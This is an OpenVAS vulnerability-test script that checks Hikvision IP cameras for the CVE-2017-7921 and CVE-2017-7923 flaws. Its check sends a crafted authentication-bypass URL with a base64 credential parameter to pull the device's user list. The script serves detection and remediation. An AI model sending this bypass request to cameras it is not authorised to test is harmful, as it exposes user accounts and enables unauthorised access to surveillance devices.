##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_hikvision_ip_cameras_mult_vuln.nasl 11983 2018-10-19 10:04:45Z mmartin $
#
# Hikvision IP Cameras Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140373");
  script_version("$Revision: 11983 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-19 12:04:45 +0200 (Fri, 19 Oct 2018) $");
  script_tag(name:"creation_date", value:"2017-09-18 11:41:11 +0700 (Mon, 18 Sep 2017)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2017-7921", "CVE-2017-7923");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Hikvision IP Cameras Multiple Vulnerabilities");

  script_category(ACT_GATHER_INFO);

  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("App-webs/banner");
  script_require_ports("Services/www", 443);

  script_tag(name:"summary", value:"Multiple Hikvision IP cameras are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple Hikvision IP cameras are prone to multiple vulnerabilities:

  - Improper authentication vulnerability (CVE-2017-7921)

  - Password in configuration file (CVE-2017-7923)");

  script_tag(name:"impact", value:"Successful exploitation of these vulnerabilities could lead to a malicious
attacker escalating his or her privileges or assuming the identity of an authenticated user and obtaining
sensitive data.");

  script_tag(name:"affected", value:"Hikvision reports that the following cameras and versions are affected:

  - DS-2CD2xx2F-I Series: V5.2.0 build 140721 to V5.4.0 build 160530

  - DS-2CD2xx0F-I Series: V5.2.0 build 140721 to V5.4.0 Build 160401

  - DS-2CD2xx2FWD Series: V5.3.1 build 150410 to V5.4.4 Build 161125

  - DS-2CD4x2xFWD Series: V5.2.0 build 140721 to V5.4.0 Build 160414

  - DS-2CD4xx5 Series: V5.2.0 build 140721 to V5.4.0 Build 160421

  - DS-2DFx Series: V5.2.0 build 140805 to V5.4.5 Build 160928

  - DS-2CD63xx Series: V5.0.9 build 140305 to V5.3.5 Build 160106");

  script_tag(name:"solution", value:"See the referenced advisory for a solution.");

  script_xref(name:"URL", value:"https://ics-cert.us-cert.gov/advisories/ICSA-17-124-01");
  script_xref(name:"URL", value:"http://www.hikvision.com/us/about_10807.html");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2017/Sep/23");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default: 443);

url = '/Security/users?auth=YWRtaW46MTEK';

if (http_vuln_check(port: port, url: url, pattern: "<UserList version", check_header: TRUE,
                    extra_check: "<userName>")) {
  report = "It was possible to obtain a list of device users at: " +
           report_vuln_url(port: port, url: url, url_only: TRUE);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
